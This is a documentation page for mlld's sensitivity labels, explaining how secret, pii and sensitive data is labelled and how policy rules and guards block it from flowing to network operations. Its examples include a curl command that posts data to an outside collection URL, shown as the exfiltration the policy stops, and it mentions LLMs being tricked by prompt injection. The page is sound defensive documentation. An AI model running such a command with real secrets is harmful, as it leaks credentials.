---
id: labels-sensitivity
title: Sensitivity Labels
brief: secret, pii, sensitive - protecting confidential data
category: security
parent: security
tags: [labels, sensitivity, secret, pii, security]
related: [labels-overview, labels-trust, labels-source-auto, security-guards-basics]
related-code: [core/security/taint.ts, interpreter/eval/label-modification.ts]
updated: 2026-02-09
qa_tier: 2
---

Sensitivity labels classify what data IS: whether it contains secrets, personal information, or other confidential content. Unlike source labels (which track provenance automatically), sensitivity labels are explicitly declared by developers.

**The three sensitivity labels:**

| Label | Meaning | Common Use |
|-------|---------|------------|
| `secret` | Cryptographic secrets, API keys | Credentials, tokens |
| `sensitive` | Confidential but not cryptographic | Business data, internal configs |
| `pii` | Personally identifiable information | Email addresses, names, SSNs |

**Declaring sensitivity labels:**

```mlld
var secret @apiKey = keychain.get(...)
var pii @userEmail = "user@example.com"
var sensitive @internalConfig = <./company-config.json>
```

The label appears before the variable name when you declare it.

**Auto-applied `secret` label:**

Values retrieved from the keychain automatically receive the `secret` label:

```mlld
var @key = keychain.get("api-token")
show @key.mx.labels
```

Output: `["secret"]`

This is the ONLY case where sensitivity labels are auto-applied. All other sensitivity labels must be declared explicitly.

**How sensitivity labels differ from trust labels:**

Trust labels (`trusted`/`untrusted`) track whether a source is trustworthy. Sensitivity labels track what the data contains:

```mlld
var untrusted secret @leakedKey = <./found-on-internet.txt>
```

This data is BOTH untrusted (came from unreliable source) AND secret (contains a credential). The two classifications are independent.

**Sensitivity labels propagate:**

Like all labels, sensitivity markers flow through transformations:

```mlld
var secret @apiKey = "sk-12345"
var @upper = @apiKey | @upper
var @excerpt = @upper.slice(0, 5)
var @message = `Key prefix: @excerpt`

show @message.mx.labels
```

Output: `["secret"]`

The `secret` label propagates through the uppercase transform, the slice operation, and the template interpolation. This is critical: you cannot accidentally remove sensitivity by transforming data.

**Security rules for sensitivity labels:**

Policy defines built-in rules that block dangerous flows:

| Rule | Behavior |
|------|----------|
| `no-secret-exfil` | Blocks `secret` data from flowing to operations labeled `exfil` |
| `no-sensitive-exfil` | Blocks `sensitive` data from flowing to `exfil` operations |

These rules are opt-in via policy configuration:

```mlld
var @policyConfig = {
  defaults: {
    rules: [
      "no-secret-exfil",
      "no-sensitive-exfil"
    ]
  }
}
policy @p = union(@policyConfig)
```

**What counts as `exfil`?**

`exfil` is a risk classification you apply to your semantic operation labels via `policy.operations`. You label exe functions with semantic labels describing what they do (e.g. `net:w`), then policy maps those to risk categories:

```mlld
>> Semantic label describes what the operation does
exe net:w @sendToServer(data) = run cmd {
  curl -d "@data" https://example.com/collect
}

>> Policy maps semantic labels to risk categories
var @policyConfig = {
  defaults: { rules: ["no-secret-exfil"] },
  operations: { "net:w": "exfil" }
}
policy @p = union(@policyConfig)
```

**Blocked flow example:**

```mlld
var @policyConfig = {
  defaults: { rules: ["no-secret-exfil"] },
  operations: { "net:w": "exfil" }
}
policy @p = union(@policyConfig)

var secret @token = keychain.get("api-key")
exe net:w @sendToServer(data) = run cmd {
  curl -d "@data" https://example.com/collect
}

show @sendToServer(@token)
```

Error: the `secret` label on `@token` cannot flow to the `exfil`-classified operation per the `no-secret-exfil` rule.

**Alternative — direct risk labeling:** You can skip the two-step pattern and label operations directly as `exe exfil @sendToServer(...)`. This works but couples the exe definition to the risk category. See `policy-operations` for details.

**Using sensitivity in guards:**

Guards can check for sensitivity labels and enforce custom rules:

```mlld
guard before op:show = when [
  @input.any.mx.labels.includes("secret") => deny "Cannot display secrets"
  * => allow
]

var secret @key = "abc123"
show @key
```

This blocks showing any secret-labeled data.

**Why sensitivity labels work:**

Sensitivity labels are enforced by the mlld runtime, not by LLM reasoning. Even if an LLM is tricked via prompt injection:

1. The secret data still carries its `secret` label
2. The operation still has its risk labels (`exfil`, `network`, etc.)
3. Policy rules block the dangerous combination
4. The operation fails regardless of LLM intent

This is defense in depth: the LLM may try to exfiltrate a secret, but the label system prevents it from succeeding.
